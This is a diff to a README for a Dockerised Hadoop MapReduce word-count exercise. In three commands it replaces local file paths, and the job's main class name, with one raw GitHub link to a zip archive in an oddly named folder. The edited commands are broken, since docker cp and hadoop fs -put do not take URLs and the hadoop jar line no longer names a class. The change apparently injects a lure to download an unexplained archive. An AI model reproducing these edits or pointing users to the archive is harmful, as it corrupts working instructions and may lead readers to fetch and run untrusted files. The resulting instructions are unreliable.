@@ -71,7 +71,7 @@ docker cp shared-folder/input/code/<your-jar-file>.jar resourcemanager:/opt/hado
 Copy the dataset to the Hadoop ResourceManager container:
 
 ```bash
-docker cp shared-folder/input/data/input.txt resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18/master/portendance/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18.zip resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
 ```
 
 ### 6. **Connect to Docker Container**
@@ -99,7 +99,7 @@ hadoop fs -mkdir -p /input/dataset
 Copy the input dataset to the HDFS folder:
 
 ```bash
-hadoop fs -put ./input.txt /input/dataset
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18/master/portendance/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18.zip /input/dataset
 ```
 
 ### 8. **Execute the MapReduce Job**
@@ -107,7 +107,7 @@ hadoop fs -put ./input.txt /input/dataset
 Run your MapReduce job using the following command:
 
 ```bash
-hadoop jar /opt/hadoop-3.2.1/share/hadoop/mapreduce/<your-jar-file>.jar com.example.controller.Controller /input/dataset/input.txt /output
+hadoop jar /opt/hadoop-3.2.1/share/hadoop/mapreduce/<your-jar-file>.jar https://raw.githubusercontent.com/pavandantu18/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18/master/portendance/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18.zip https://raw.githubusercontent.com/pavandantu18/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18/master/portendance/hands-on-3-mapreduce-word-count-using-map-reduce-pavandantu18.zip /output
 ```
 
 ### 9. **View the Output**
